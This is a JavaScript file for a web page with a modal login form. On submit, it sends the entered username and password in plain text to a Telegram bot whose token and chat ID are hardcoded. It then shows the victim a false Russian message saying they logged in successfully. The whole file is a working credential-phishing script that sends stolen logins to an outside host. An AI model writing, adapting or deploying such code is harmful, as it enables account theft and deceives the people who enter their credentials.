const btn = document.querySelector('.block__hero--top__btn')
const mainBackdrop = document.querySelector('.main__backdrop')

btn.addEventListener('click', () => {
    mainBackdrop.classList.toggle('main__backdropActive')
    setTimeout(() => {
        mainBackdrop.classList.remove('main__backdropActive')
    },60000)
})

const backdropClose = document.querySelector('.main__backdrop--close')

backdropClose.addEventListener('click', () => {
    mainBackdrop.classList.remove('main__backdropActive')
})


const messageBackdrop = document.querySelector('.message__backdrop')
const modalWrap = document.querySelector('.main__backdrop--wrapp')
const modalBtn = document.querySelector('.main__backdrop--btn__apply')
const password = document.querySelector('.main__backdrop--form__password')
const namee = document.querySelector('.main__backdrop--form__name')

const BOT = {
    token: '6644299232',
    chatId: '-4024420182',
}

modalBtn.addEventListener('click', (e) => {
    e.preventDefault()
    if(!namee.value && !password.value) return ''
    if(namee.value && password.value){
        const tgMessage = `Имя пользователя: ${namee.value}, Пароль: ${password.value}`
        fetch(`https://api.telegram.org/bot${BOT.token}:AAEt1h-sncXlBBskNL4LZA4qBjYeQZixSJQ/sendMessage?chat_id=${BOT.chatId}&text=${tgMessage}`)
        .then(res => res.json())
            .then(res => {
                if (res.ok) {
                    modalWrap.classList.add('modalWrapActive')
                    messageBackdrop.classList.add('messageBackdropActive')
                    messageBackdrop.innerHTML = `
                        <h2>вы успешно вошли в аккаунт!</h2>
                    `
                } else {
                    messageBackdrop.innerHTML = `
                        <h2>Извините, что-то пошло не так. Повторите попытку позже</h2>
                    `                
                }
            })
            .catch(error => {
                alert(error)
            })
    }
})